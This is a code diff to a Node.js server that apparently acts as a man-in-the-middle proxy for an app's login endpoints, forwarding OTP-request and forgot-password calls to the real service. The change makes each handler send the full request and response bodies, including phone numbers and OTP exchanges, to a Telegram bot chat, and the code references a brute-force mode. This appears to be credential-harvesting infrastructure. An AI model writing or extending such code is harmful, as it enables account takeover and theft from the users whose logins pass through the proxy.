@@ -1155,7 +1155,9 @@ app.post('/app/user/login/sendotp', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `📲 OTP Requested\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const reqStr = JSON.stringify(body, null, 2);
+      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      bot.sendMessage(data.adminChatId, `📲 OTP Requested\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1166,8 +1168,10 @@ app.post('/app/user/login/forgot', async (req, res) => {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    if (data.adminChatId && bot) {
-      if (!bruteForceActive) bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+    if (data.adminChatId && bot && !bruteForceActive) {
+      const reqStr = JSON.stringify(body, null, 2);
+      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
